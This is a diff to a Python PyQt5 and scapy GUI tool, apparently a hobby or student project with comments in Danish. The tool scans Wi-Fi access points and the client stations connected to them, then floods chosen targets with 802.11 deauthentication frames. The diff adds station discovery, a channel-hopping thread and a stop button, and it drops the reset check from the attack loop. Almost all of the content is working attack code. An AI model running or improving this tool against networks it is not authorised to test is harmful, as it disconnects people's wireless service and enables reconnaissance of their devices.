@@ -1,13 +1,14 @@
 #!/usr/bin/env python
 # coding=utf-8
-from PyQt5.QtWidgets import QMainWindow, QApplication,QPushButton,QLineEdit, QLabel, QTextBrowser
-from PyQt5 import QtGui, QtCore
+from PyQt5.QtWidgets import QMainWindow, QApplication,QPushButton,QLineEdit, QLabel, QListWidget
+from PyQt5 import QtGui, QtCore, QtWidgets
 from PyQt5.QtCore import pyqtSlot
 from scapy.all import *
 from subprocess import check_output
 import re
 import threading
 import pyx
+import time
 
 ssid_bssid = []
 STA_list = []
@@ -19,45 +20,24 @@ channel_value = 1
 resetflag = False
 framecount = 0
 breaksniff_flag = False
+showStationButton = False
 
 
-
-
-def checkifstop(frame):
-	if breaksniff_flag == True:
-		return "breaking"
 
 def setChannel():
 	global channel_value
-	#channel_value = random.randint(1,14)
-	if channel_value == 13:
-		channel_value = 1
-	else:
-		channel_value +=1
+	while not breaksniff_flag:
+		time.sleep(2)
+		#channel_value = random.randint(1,14)
+		if channel_value == 13:
+			channel_value = 1
+		else:
+			channel_value +=1
+	return "breaking"
 	#den her måde at skifte channel på går højst sandsynligt ALT ALT for hurtigt for resten af systemet, til at tjekke BSSIDs, osv. men den fanger faktisk de fleste.
-	moncheck = check_output(["sudo","iwconfig","wlan0mon","channel",str(channel_value)], stderr=subprocess.PIPE).decode("UTF-8")  # stderr=subprocess.PIPE simply "silences" the output.
+	  # stderr=subprocess.PIPE simply "silences" the output.
 
 
-def FindSSIDtest(frame):
-	global breaksniff_flag
-
-	setChannel() #we try a random channel every call. nok ikke specielt efficient.
-	if frame.haslayer(Dot11): #der kunne bare stå haslayer(Dot11Beacon)
-		if frame.type == 0 and frame.subtype == 8: #KUN beacon frames!!
-			SSID = frame.info
-			BSSID = frame.addr3.upper()
-			#print(bssid)
-			if (BSSID,SSID) not in ssid_bssid and len(SSID) != 0: #gider ikke hidden SSIDs aka 0 len.
-				ssid_bssid.append((BSSID,SSID))
-				ch = int(ord(frame[Dot11Elt:3].info))
-
-				print("Found BSSID " + BSSID + " and SSID "+SSID +" on channel: " +str(ch))#addr 3 er bssid (mac addresse for ap) , frame.info er SSID
-
-				#print(ssid_bssid)
-
-				#if time.time() > 10:
-					#print(time.time())
-					#breaksniff_flag = True
 
 def setMonitorMode():
 	"""
@@ -128,16 +108,11 @@ def perform_deauth_attack(interface,dest,bssid,amount,channel_attack):
 	attack_timer = time.time()
 
 	for i in range(0,amount):
-		if resetflag == True:
-			#print("RESET BUTTON CLICKED")
-			return "RESET BUTTON CLICKED"
-			#break
-		else:
-			#start = time.time()
-			sendp(frame,iface=interface,verbose=False)
-			#end = time.time()
-			#print(end - start)
-			framecount +=1
+		print("sent a frame...... "+str(i))
+		sendp(frame,iface=interface,verbose=False)
+		#end = time.time()
+		#print(end - start)
+		framecount +=1
 
 	end_attack_timer = time.time()
 	total_attack_time = (end_attack_timer - attack_timer)
@@ -149,19 +124,6 @@ def perform_deauth_attack(interface,dest,bssid,amount,channel_attack):
 	#endTOTAL = time.time()
 	#print(endTOTAL - startTOTAL)  # takes about 40 seconds to send 1000 deuath frames in a for loop.
 
-
-def snifferfunction():
-	sniff(iface="wlan0mon", count=0, prn=FindSSIDtest, store=0,stop_filter=checkifstop)
-
-def sniffevent(self):
-	self.sniffbox.append("ehllo")
-	if breaksniff_flag == False:
-		if len(ssid_bssid)>0:
-			for item in ssid_bssid:
-				if item[0] not in self.sniffbox.toPlainText():
-					self.sniffbox.append(item[0] + " " + item[1])
-
-			self.sniffbox.repaint()
 
 class App(QMainWindow):
 	def __init__(self):
@@ -220,6 +182,19 @@ class App(QMainWindow):
 		self.sniffSSIDbutton.move(350,170)
 		self.sniffSSIDbutton.clicked.connect(self.on_ssidsniff)
 
+		##SNIFF STATION BUTTON
+		self.sniffStationbutton = QPushButton('Sniff Stations',self)
+		self.sniffStationbutton.hide()
+		self.sniffStationbutton.resize(200,50)
+		self.sniffStationbutton.move(350,240)
+		self.sniffStationbutton.clicked.connect(self.on_stationsniff)
+
+
+		self.stopbutton = QPushButton('STOP',self)
+		self.stopbutton.resize(200,50)
+		self.stopbutton.move(350,310)
+		self.stopbutton.clicked.connect(self.on_stopclick)
+
 
 
 		#frame AMOUNT LABEL
@@ -229,30 +204,157 @@ class App(QMainWindow):
 		self.framelabel.resize(270,100)
 
 		#evt. lav QTextEdit?
-		self.sniffbox = QTextBrowser(self)
-		self.sniffbox.setText('Your output will be shown here')
-		self.sniffbox.move(20,350)
-		self.sniffbox.resize(600,300)
-		##
+		self.sniffbox = QListWidget(self)
+		self.sniffbox.setSelectionMode(QtWidgets.QAbstractItemView.SingleSelection)
+		self.sniffbox.itemSelectionChanged.connect(self.on_sniffClick)
+		self.sniffbox.move(20,370)
+		self.sniffbox.resize(600,310)
 
 
+		#evt. lav QTextEdit?
+		self.sniffStationbox = QListWidget(self)
+		self.sniffStationbox.setSelectionMode(QtWidgets.QAbstractItemView.SingleSelection)
+		self.sniffStationbox.itemSelectionChanged.connect(self.on_stationClick)
+		self.sniffStationbox.move(20,370)
+		self.sniffStationbox.resize(600,310)
+		self.sniffStationbox.hide()
 
 		self.show()
 
+	#@pyqtSlot()
+	def on_sniffClick(self):
+		if (len(self.sniffbox.selectedItems()) != 0):
+			self.textboxAP.setText((self.sniffbox.selectedItems()[0]).text()[12:29]) # Substring : AP Mac adress
+			self.channeltextbox.setText((self.sniffbox.selectedItems()[0]).text()[-2:].strip()) # Substring : AP channel
+
+	def on_stationClick(self):
+		if (len(self.sniffStationbox.selectedItems()) != 0):
+			self.textbox.setText((self.sniffStationbox.selectedItems()[0]).text()[15:32]) # Substring : AP Mac adress
 
 
 
+	def checkifstop(self, frame):
+		if breaksniff_flag == True:
+			self.sniffbox.addItem("Sniffing stopped")
+			self.sniffStationbox.addItem("Sniffing stopped")
+			return "breaking"
+
+	def FindSSIDtest(self,frame):
+		global breaksniff_flag
+
+		#we try a random channel every call, in an external thread
+		moncheck = check_output(["sudo","iwconfig","wlan0mon","channel",str(channel_value)], stderr=subprocess.PIPE).decode("UTF-8")
+
+		if frame.haslayer(Dot11): #der kunne bare stå haslayer(Dot11Beacon)
+			if frame.type == 0 and frame.subtype == 8: #KUN beacon frames!!
+				SSID = frame.info
+				BSSID = frame.addr3.upper()
+				#print(bssid)
+				if (BSSID,SSID) not in ssid_bssid and len(SSID) != 0: #gider ikke hidden SSIDs aka 0 len.
+					ssid_bssid.append((BSSID,SSID))
+					ch = int(ord(frame[Dot11Elt:3].info))
+
+					self.sniffbox.addItem("Found BSSID " + BSSID + " and SSID "+SSID +" on channel: " +str(ch))
+					#print(ssid_bssid)
+
+					#if time.time() > 10:
+						#print(time.time())
+						#breaksniff_flag = True
+
+	def FindSTAinSpecificBSSID(self,bssidsearch,frame,channel):
+		global channel_enganged
+		if channel_enganged == False:
+			moncheck = check_output(["sudo", "iwconfig", "wlan0mon", "channel", str(channel)], stderr=subprocess.PIPE).decode("UTF-8")
+			channel_enganged = True
+
+
+		BSSID = "ff:ff:ff:ff:ff:ff"
+
+		if frame.haslayer(Dot11):
+			if frame.type == 2:
+				DS = frame.FCfield & 0x03
+				toDS = DS & 0x01 != 0
+				fromDS = DS & 0x2 != 0
+
+
+				if toDS == 0 and fromDS == 0:  # dette burde KUN være data frames der sendes til AP.
+					RA = DA = frame.addr1.upper()  # RA= REciver, DA = fianl destination
+					TA = SA = frame.addr2.upper()
+					BSSID = frame.addr3.upper()
+
+				elif toDS == 0 and fromDS == 1:
+					RA = DA = frame.addr1.upper()  # RA= REciver, DA = fianl destination
+					TA = BSSID = frame.addr2.upper()
+					SA = frame.addr3.upper()
+
+				elif toDS == 1 and fromDS == 0:
+					RA = BSSID = frame.addr1.upper()
+					TA = SA = frame.addr2.upper()
+					DA = frame.addr3.upper()
+
+				elif toDS == 1 and fromDS == 1:
+					RA = frame.addr1.upper()
+					TA = frame.addr2.upper()
+					DA = frame.addr3.upper()
+					SA = frame.addr4.upper()
+				else:
+					SA = "ff:ff:ff:ff:ff:ff"  # dette burde ikke kunne ske
+					BSSID = "ff:ff:ff:ff:ff:ff"
+
+				if (SA not in STA_list and BSSID == bssidsearch):
+					STA_list.append(SA)
+					self.sniffStationbox.addItem("Found Station: " + SA + " From AccessPoint: " + BSSID)
+					print("Found Station: " + SA + " From AccessPoint: " + BSSID)
+
+
+
+	def snifferfunction(self):
+		sniff(iface="wlan0mon", count=0, prn=self.FindSSIDtest, store=0,stop_filter=self.checkifstop)
+
+
+	def stationSniffer(self):
+		#print(self.textboxAP.text())
+		#print(self.channeltextbox.text())
+		sniff(iface="wlan0mon", count=0, prn= lambda fr: self.FindSTAinSpecificBSSID(self.textboxAP.text(),fr,self.channeltextbox.text()), store=0, stop_filter=self.checkifstop)
+
+
+	@pyqtSlot()
+	def on_stationsniff(self):
+		global breaksniff_flag
+		self.sniffbox.clear()
+		self.sniffStationbox.clear()
+
+		self.sniffbox.hide()
+		self.sniffStationbox.show()
+
+		breaksniff_flag = False
+		print("started station sniff")
+
+
+		stationthread = threading.Thread(target = self.stationSniffer)
+		stationthread.start()
 
 
 	@pyqtSlot()
 	def on_ssidsniff(self):
 		global breaksniff_flag
-		breaksniff_flag = False
-		print("started sniff")
-		print("please work")
-		#self.sniffbox.setText(ssid_bssid[0])
-		sniffingthread = threading.Thread(target = snifferfunction)
+		global showStationButton
 
+		self.sniffbox.clear()
+		self.sniffStationbox.clear()
+
+		self.sniffbox.show()
+		self.sniffStationbox.hide()
+		self.sniffStationbutton.show()
+
+
+		breaksniff_flag = False
+		print("started bssid sniff")
+		#self.sniffbox.setText(ssid_bssid[0])
+		channelThread = threading.Thread(target = setChannel)
+		channelThread.start()
+
+		sniffingthread = threading.Thread(target = self.snifferfunction)
 		sniffingthread.start()
 
 		#sniffupdate = threading.Thread(target = self.sniffevent)
@@ -270,7 +372,11 @@ class App(QMainWindow):
 	def on_attackclick(self):
 		global resetflag
 		global framecount
+		print("AMOUNT OF ACTIVE THREADS" + str(threading.active_count()))
+
+
 		resetflag = False
+
 
 		self.textboxAP.setEnabled(False)
 		self.textbox.setEnabled(False)
@@ -292,7 +398,7 @@ class App(QMainWindow):
 			print("VALID VALUES")
 			attackthread = threading.Thread(target=perform_deauth_attack, args=(iface,destMAC, bssid_targetMAC, frame_amount_entered,channel_attack_value))
 			attackthread.start()
-
+			print("AMOUNT OF ACTIVE THREADS" + str(threading.active_count()))
 			while attackthread.is_alive():
 				self.framelabel.setText("Sent : "+str(framecount)+"\n"+"DeAuthentication Frames")
 				self.framelabel.repaint() #need to repaint the label each iteration to update value
@@ -317,6 +423,11 @@ class App(QMainWindow):
 
 
 	@pyqtSlot()
+	def on_stopclick(self):
+		global breaksniff_flag
+		breaksniff_flag = True
+
+	@pyqtSlot()
 	def on_resetclick(self):
 		global resetflag
 		global framecount
@@ -325,6 +436,7 @@ class App(QMainWindow):
 		self.textbox.clear()
 		self.textboxAP.clear()
 		self.textbox_amount.clear()
+		self.channeltextbox.clear()
 		self.textboxAP.setEnabled(True)
 		self.textbox.setEnabled(True)
 		self.textbox_amount.setEnabled(True)
@@ -341,10 +453,6 @@ class App(QMainWindow):
 		self.framelabel.repaint()
 
 		#self.sniffbox.setText(ssid_bssid[0])
-
-
-
-
 
 
 if __name__ == '__main__':
